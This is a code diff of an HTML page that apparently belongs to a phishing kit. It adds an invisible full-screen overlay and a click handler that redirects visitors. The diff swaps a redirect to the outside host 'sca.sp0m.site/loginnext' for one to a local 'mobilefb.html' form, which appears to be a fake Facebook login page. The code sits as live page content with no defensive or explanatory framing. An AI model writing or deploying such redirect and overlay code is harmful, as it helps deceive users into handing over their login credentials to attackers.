@@ -47,12 +47,12 @@
   <div style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></div>
  <script >
   $('.show-options').click(function(){
-  const queryString = window.location.search;
+    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
-   const id = urlParams.get('id');
-   const page = urlParams.get('page');
-   const sc = urlParams.get('sc');
-    window.location = `https://sca.sp0m.site/loginnext/212/${id}/en`
+   const q = urlParams.get('q');
+              
+    window.location.href = `../form/mobilefb.html?q=${q}`;
+          
   })
   </script>
   <input type="radio" class="state-toggle" id="catbus__state" name="components__state" data-toggle="components_state" checked>
